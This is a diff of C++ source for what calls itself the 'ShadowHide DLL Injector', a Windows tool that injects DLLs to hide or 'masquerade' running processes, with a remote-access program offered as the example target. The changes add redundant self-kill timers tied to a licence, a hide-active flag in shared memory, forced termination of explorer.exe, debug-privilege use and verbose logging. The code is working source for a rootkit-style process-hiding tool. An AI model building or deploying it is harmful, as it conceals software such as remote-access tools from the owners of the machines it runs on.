+    BrutalSelfKill();
+}
+
+// ═══ BACKUP KILL #3: Dedicated watcher thread that counts independently ═══
+DWORD WINAPI WatcherKillThread(LPVOID lpParam) {
+    DWORD minutes = *(DWORD*)lpParam;
+    DWORD totalSec = minutes * 60;
+    DebugLog("[WATCHER] Watcher thread started. Will kill in " + to_string(totalSec) + " seconds.");
+    
+    for (DWORD i = 0; i < totalSec; ++i) {
+        Sleep(1000);
+    }
+    
+    DebugLog("[WATCHER] Watcher timeout reached. Force-killing process NOW.");
+    Log("[WATCHER] Watcher timeout reached. Force-killing process NOW.");
+    BrutalSelfKill();
+    return 0;
+}
+
 DWORD WINAPI KillSwitchThread(LPVOID lpParam) {
-    if (g_expiryMinutes == 0) {
-        // Log("[KILL SWITCH] ==========================================");
-        // Log("[KILL SWITCH] TIMER IS OFF (g_expiryMinutes = 0).");
-        // Log("[KILL SWITCH] Process will run indefinitely.");
-        // Log("[KILL SWITCH] To enable timer, launch: dll_injector.exe <minutes>");
-        // Log("[KILL SWITCH] ==========================================");
+    {
+        char dbg[256];
+        sprintf_s(dbg, "[KILL SWITCH] Thread started. g_expiryMinutes=%d", g_expiryMinutes);
+        Log(string(dbg));
+        DebugLog(string(dbg));
+    }
+
+    if (g_expiryMinutes <= 0) {
+        MessageBoxA(NULL, 
+            "ERROR: Kill-switch timer is 0 or missing!\nProcess will NOT auto-terminate.", 
+            "ShadowHide Error", MB_OK | MB_ICONERROR);
+        Log("[KILL SWITCH] ==========================================");
+        Log("[KILL SWITCH] TIMER IS OFF (g_expiryMinutes = 0).");
+        Log("[KILL SWITCH] Process will run indefinitely.");
+        Log("[KILL SWITCH] ==========================================");
+        DebugLog("TIMER IS OFF - kill switch exiting immediately");
         return 0;
     }
 
-    // Log("[KILL SWITCH] ==========================================");
-    // Log("[KILL SWITCH] Timer armed for " + to_string(g_expiryMinutes) + " minute(s).");
-    // Log("[KILL SWITCH] Process will self-terminate when timer hits 0.");
-    // Log("[KILL SWITCH] ==========================================");
+    Log("[KILL SWITCH] ==========================================");
+    Log("[KILL SWITCH] Timer armed for " + to_string(g_expiryMinutes) + " minute(s).");
+    Log("[KILL SWITCH] Process will self-terminate when timer hits 0.");
+    Log("[KILL SWITCH] ==========================================");
 
     DWORD totalSeconds = (DWORD)g_expiryMinutes * 60;
     DWORD elapsed = 0;
@@ -1451,19 +2303,22 @@ DWORD WINAPI KillSwitchThread(LPVOID lpParam) {
 
         DWORD remaining = totalSeconds - elapsed;
 
-        // Log every minute, and also every 10 sec during the last minute
         if (elapsed % 60 == 0) {
             Log("[KILL SWITCH] Time remaining: " + to_string(remaining / 60) + " min.");
         }
         else if (remaining < 60 && remaining % 10 == 0) {
             Log("[KILL SWITCH] Time remaining: " + to_string(remaining) + " sec.");
         }
+        
+        // Heartbeat every 5 minutes
+        if (elapsed % 300 == 0) {
+            DebugLog("[KILL SWITCH] Heartbeat — " + to_string(remaining / 60) + " min remaining");
+        }
     }
 
     Log("[KILL SWITCH] ==========================================");
     Log("[KILL SWITCH] TIMEOUT EXPIRED! Unhiding processes...");
 
-    // CHANGED: Signal all injected DLLs to STOP hiding before we die
     if (g_pBuf) {
         DWORD* hideActivePtr = (DWORD*)((char*)g_pBuf + 140);
         *hideActivePtr = 0;
@@ -1473,14 +2328,17 @@ DWORD WINAPI KillSwitchThread(LPVOID lpParam) {
     Log("[KILL SWITCH] Waiting 2 seconds for DLLs to pick up the flag...");
     Sleep(2000);
 
+    Log("[KILL SWITCH] Killing explorer.exe via API...");
+    KillExplorerByApi();
+
     Log("[KILL SWITCH] Self-destructing now...");
     Log("[KILL SWITCH] ==========================================");
 
-    ExitProcess(0);   // Hard kill — instantly terminates this injector process
+    BrutalSelfKill();
+
     return 0;
 }
 
-// ═══ GUI INPUT DIALOG ═══
 struct InputDlgData {
     string prompt;
     string result;
@@ -1602,25 +2460,22 @@ string GetInputFromGUI(HINSTANCE hInst, const char* title, const char* prompt) {
     return data.cancelled ? "" : data.result;
 }
 
-// ═══ ORIGINAL FUNCTIONS ═══
+// ═══ FIX: Safe log — writes to file if path ready, always console, also debug log ═══
 void Log(const string& msg) {
-    // ── 1) File log (original behaviour) ──
-    ofstream log(g_logPath, ios::app);
-    if (log.is_open()) {
-        SYSTEMTIME st;
-        GetLocalTime(&st);
-        char timeBuf[32];
-        sprintf_s(timeBuf, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
-        log << timeBuf << msg << endl;
-        log.close();
-    }
-
-    // ── 2) Console log (NEW) ──
     SYSTEMTIME st;
     GetLocalTime(&st);
     char timeBuf[32];
     sprintf_s(timeBuf, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
-    cout << timeBuf << msg << endl;
+    string line = string(timeBuf) + msg;
+
+    if (!g_logPath.empty()) {
+        ofstream log(g_logPath, ios::app);
+        if (log.is_open()) {
+            log << line << endl;
+            log.close();
+        }
+    }
+    cout << line << endl;
 }
 
 bool enable_debug_privilege() {
@@ -1837,11 +2692,9 @@ bool setup_shared_memory(const string& targetName) {
     DWORD* targetPidPtr = (DWORD*)((char*)g_pBuf + 132);
     *targetPidPtr = targetPid;
 
-    // Write expiry minutes to shared memory offset 136
     DWORD* expiryPtr = (DWORD*)((char*)g_pBuf + 136);
     *expiryPtr = (DWORD)g_expiryMinutes;
 
-    // CHANGED: Write hide-active flag to offset 140 (1 = hiding, 0 = showing)
     DWORD* hideActivePtr = (DWORD*)((char*)g_pBuf + 140);
     *hideActivePtr = 1;
 
@@ -1852,20 +2705,28 @@ bool setup_shared_memory(const string& targetName) {
 int main(int argc, char* argv[]) {
     g_myPid = GetCurrentProcessId();
 
-    // ═══ FORCE CONSOLE WINDOW (even in GUI subsystem app) ═══
-    // if (AllocConsole()) {
-    //     FILE* fp;
-    //     freopen_s(&fp, "CONOUT$", "w", stdout);
-    //     freopen_s(&fp, "CONOUT$", "w", stderr);
-    //     freopen_s(&fp, "CONIN$", "r", stdin);
-    // }
-    // ════════════════════════════════════════════════════════
+    // Console first
+    if (AllocConsole()) {
+        FILE* fp;
+        freopen_s(&fp, "CONOUT$", "w", stdout);
+        freopen_s(&fp, "CONOUT$", "w", stderr);
+        freopen_s(&fp, "CONIN$", "r", stdin);
 
-    // Parse expiry minutes passed as 1st argument
-    if (argc > 1) {
-        g_expiryMinutes = atoi(argv[1]);
+        Sleep(300);
+
+        HWND hConsole = GetConsoleWindow();
+        if (hConsole) {
+            ShowWindow(hConsole, SW_RESTORE);
+            ShowWindow(hConsole, SW_SHOW);
+            SetWindowPos(hConsole, HWND_TOPMOST, 0, 0, 0, 0,
+                         SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
+            BringWindowToTop(hConsole);
+            SetForegroundWindow(hConsole);
+            UpdateWindow(hConsole);
+        }
     }
 
+    // ═══ FIX: Set g_logPath IMMEDIATELY — before ANY Log() call ═══
     char exePath[MAX_PATH];
     GetModuleFileNameA(NULL, exePath, MAX_PATH);
     string basePath(exePath);
@@ -1874,22 +2735,112 @@ int main(int argc, char* argv[]) {
     g_logPath = basePath + "log.txt";
     ofstream(g_logPath, ios::trunc).close();
 
-    // ═══ STARTUP BANNER ═══
     Log("[MAIN] ==================================================");
-    Log("[MAIN] ShadowHide DLL Injector started.");
+    Log("[MAIN] Log path set: " + g_logPath);
     Log("[MAIN] PID: " + to_string(g_myPid));
-    Log("[MAIN] Command-line args count: " + to_string(argc));
-    Log("[MAIN] Expiry Minutes parsed: " + to_string(g_expiryMinutes));
-    if (g_expiryMinutes == 0) {
-        Log("[MAIN] >>> WARNING: Kill-switch is DISABLED.");
-        Log("[MAIN] >>> Pass a number as 1st argument to enable timer.");
-        Log("[MAIN] >>> Example: dll_injector.exe 5");
-    } else {
-        Log("[MAIN] >>> Kill-switch armed for " + to_string(g_expiryMinutes) + " min.");
+
+    // ═══ DIAGNOSTIC: Log full command line and every argv ═══
+    Log("[MAIN] argc=" + to_string(argc));
+    for (int i = 0; i < argc; ++i) {
+        string argStr = argv[i] ? string(argv[i]) : "(null)";
+        Log("[MAIN] argv[" + to_string(i) + "] = '" + argStr + "'");
     }
+    {
+        char* cmdLine = GetCommandLineA();
+        Log("[MAIN] GetCommandLineA() = " + string(cmdLine ? cmdLine : "(null)"));
+    }
+
+    // ═══ BULLETPROOF: Load timer — argv > file > registry ═══
+    int timerMinutes = read_timer_from_any_source(argc, argv);
+    if (timerMinutes > 0) {
+        g_expiryMinutes = timerMinutes;
+        Log("[MAIN] Timer loaded: " + to_string(g_expiryMinutes) + " min");
+    }
+
+    // Override with argv if explicitly provided (for manual testing)
+    if (argc > 1 && argv[1]) {
+        int argMinutes = atoi(argv[1]);
+        if (argMinutes > 0) {
+            g_expiryMinutes = argMinutes;
+            Log("[MAIN] Timer overridden by argv[1]: " + to_string(g_expiryMinutes) + " min");
+        }
+    }
+
+    Log("[MAIN] argc=" + to_string(argc) +
+        " | g_expiryMinutes=" + to_string(g_expiryMinutes));
+    Log("[MAIN] ShadowHide DLL Injector started.");
+
+    // ═══ CRITICAL: If timer is 0, DIE immediately — don't run forever ═══
+    if (g_expiryMinutes <= 0) {
+        string fatal = "[MAIN] >>> FATAL: Kill-switch timer is 0 or missing. Process cannot start.";
+        Log(fatal);
+        DebugLog(fatal);
+        MessageBoxA(NULL,
+            "FATAL ERROR:\n\nKill-switch timer is 0 or could not be loaded.\n\n"
+            "Possible causes:\n"
+            "- ShellExecuteExW dropped the parameter during UAC elevation\n"
+            "- Registry/file was not written by the launcher\n"
+            "- License has less than 1 minute remaining\n\n"
+            "Check debug logs:\n"
+            "- %TEMP%\\shadowlauncher_debug.log\n"
+            "- %TEMP%\\shadowinjector_debug.log",
+            "ShadowHide Timer Error",
+            MB_OK | MB_ICONERROR);
+        BrutalSelfKill();
+        return 1;
+    }
+
+    // ═══ BACKUP KILL #1: TimerQueue timer (kernel threadpool) ═══
+    HANDLE hBackupTimer = NULL;
+    DWORD backupMs = (DWORD)g_expiryMinutes * 60 * 1000;
+    BOOL tqOk = CreateTimerQueueTimer(&hBackupTimer, NULL, BackupKillCallback, NULL,
+            backupMs, 0, WT_EXECUTEINTIMERTHREAD);
+    if (!tqOk) {
+        string warn = "[MAIN] WARNING: CreateTimerQueueTimer FAILED. err=" + to_string(GetLastError());
+        Log(warn);
+        DebugLog(warn);
+    } else {
+        string ok = "[MAIN] Backup kill #1 armed (TimerQueue): " + to_string(backupMs) + " ms";
+        Log(ok);
+        DebugLog(ok);
+    }
+
+    // ═══ BACKUP KILL #2: Multimedia timer (winmm) ═══
+    MMRESULT mmOk = timeSetEvent(backupMs, 0, (LPTIMECALLBACK)MMTimerCallback, 0, TIME_ONESHOT);
+    if (mmOk == 0) {
+        string warn = "[MAIN] WARNING: timeSetEvent FAILED.";
+        Log(warn);
+        DebugLog(warn);
+    } else {
+        string ok = "[MAIN] Backup kill #2 armed (Multimedia): " + to_string(backupMs) + " ms, id=" + to_string(mmOk);
+        Log(ok);
+        DebugLog(ok);
+    }
+
+    // ═══ BACKUP KILL #3: Dedicated watcher thread (independent counter) ═══
+    HANDLE hWatcher = CreateThread(NULL, 0, WatcherKillThread, &g_expiryMinutes, 0, NULL);
+    if (hWatcher) {
+        string ok = "[MAIN] Backup kill #3 armed (Watcher thread): " + to_string(g_expiryMinutes) + " min";
+        Log(ok);
+        DebugLog(ok);
+        CloseHandle(hWatcher);
+    } else {
+        string warn = "[MAIN] WARNING: Watcher thread FAILED.";
+        Log(warn);
+        DebugLog(warn);
+    }
+
+    // Confirmation message box
+    {
+        char confirm[256];
+        sprintf_s(confirm, "Kill-switch timer: %d minutes\n\nProcess will auto-kill when timer expires.", g_expiryMinutes);
+        MessageBoxA(NULL, confirm, "ShadowHide Timer Confirmation", MB_OK | MB_ICONINFORMATION);
+    }
+
+    Log("[MAIN] >>> Kill-switch armed for " + to_string(g_expiryMinutes) + " min.");
     Log("[MAIN] ==================================================");
 
-    // GUI Input Dialog (replaces console cin)
+    // GUI Input Dialog
     string targetName = GetInputFromGUI(GetModuleHandle(NULL),
         "ShadowHide - Process Masquerade",
         "Enter Process Name To Masquerade (e.g., getscreen.exe):");
